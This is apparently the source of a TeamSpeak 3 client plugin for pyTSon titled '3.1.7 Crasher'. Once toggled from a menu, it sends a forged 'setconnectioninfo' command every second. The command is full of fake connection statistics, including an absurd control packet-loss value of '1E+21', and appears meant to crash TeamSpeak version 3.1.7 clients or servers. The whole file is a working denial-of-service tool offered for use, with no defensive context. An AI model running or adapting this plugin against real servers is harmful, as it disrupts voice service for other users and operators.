from ts3plugin import ts3plugin
from PythonQt.QtCore import QTimer, Qt
from bluscream import timestamp, sendCommand
from traceback import format_exc
import ts3defines, ts3lib

class crasher_3_1_7(ts3plugin):
    name = "3.1.7 Crasher"
    apiVersion = 21
    requestAutoload = False
    version = "1"
    author = "Bluscream"
    description = "( .) ( .)"
    offersConfigure = False
    commandKeyword = ""
    infoTitle = None
    menuItems = [(ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 0, "Toggle " + name, "")]
    hotkeys = []
    debug = False
    timers = {}
    setconnectioninfo = [
        ("connection_ping","1337"),
        ("connection_ping_deviation","88"),
        ("connection_packets_sent_speech","1"),
        ("connection_packets_sent_keepalive","2"),
        ("connection_packets_sent_control","3"),
        ("connection_bytes_sent_speech","0"),
        ("connection_bytes_sent_keepalive","0"),
        ("connection_bytes_sent_control","0"),
        ("connection_packets_received_speech","0"),
        ("connection_packets_received_keepalive","0"),
        ("connection_packets_received_control","0"),
        ("connection_bytes_received_speech","0"),
        ("connection_bytes_received_keepalive","0"),
        ("connection_bytes_received_control","0"),
        ("connection_server2client_packetloss_speech","0"),
        ("connection_server2client_packetloss_keepalive","0"),
        ("connection_server2client_packetloss_control","1E+21"),
        ("connection_server2client_packetloss_total","0"),
        ("connection_bandwidth_sent_last_second_speech","0"),
        ("connection_bandwidth_sent_last_second_keepalive","0"),
        ("connection_bandwidth_sent_last_second_control","0"),
        ("connection_bandwidth_sent_last_minute_speech","0"),
        ("connection_bandwidth_sent_last_minute_keepalive","0"),
        ("connection_bandwidth_sent_last_minute_control","0"),
        ("connection_bandwidth_received_last_second_speech","0"),
        ("connection_bandwidth_received_last_second_keepalive","0"),
        ("connection_bandwidth_received_last_second_control","0"),
        ("connection_bandwidth_received_last_minute_speech","0"),
        ("connection_bandwidth_received_last_minute_keepalive","0"),
        ("connection_bandwidth_received_last_minute_control","0")
    ]

    def __init__(self):
        if self.debug: ts3lib.printMessageToCurrentTab("{0}[color=orange]{1}[/color] Plugin for pyTSon by [url=https://github.com/{2}]{2}[/url] loaded.".format(timestamp(), self.name, self.author))

    def stop(self):
        for schid, timer in self.timers.items():
            self.stopTimer(schid)

    def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
        if atype != ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL or menuItemID != 0: return
        if schid in self.timers: self.stopTimer(schid)
        else: self.startTimer(schid)

    def startTimer(self, schid):
        self.timers[schid] = QTimer()
        self.timers[schid].timeout.connect(self.tick)
        self.timers[schid].start(1000)

    def stopTimer(self, schid):
        if schid in self.timers:
            self.timers[schid].stop()
            del self.timers[schid]

    def onConnectStatusChangeEvent(self, schid, newStatus, errorNumber):
        if newStatus == ts3defines.ConnectStatus.STATUS_CONNECTION_ESTABLISHED:
            pass # self.startTimer(schid)
        elif newStatus == ts3defines.ConnectStatus.STATUS_DISCONNECTED:
             self.stopTimer(schid)

    def tick(self):
        try: sendCommand(self.name, self.buildConnectionInfo()) # TODO: ADD SCHID
        except: print(format_exc())

    def buildConnectionInfo(self):
        cmd = "setconnectioninfo"
        for key in self.setconnectioninfo:
            cmd += " {}={}".format(key[0], key[1])
        return cmd
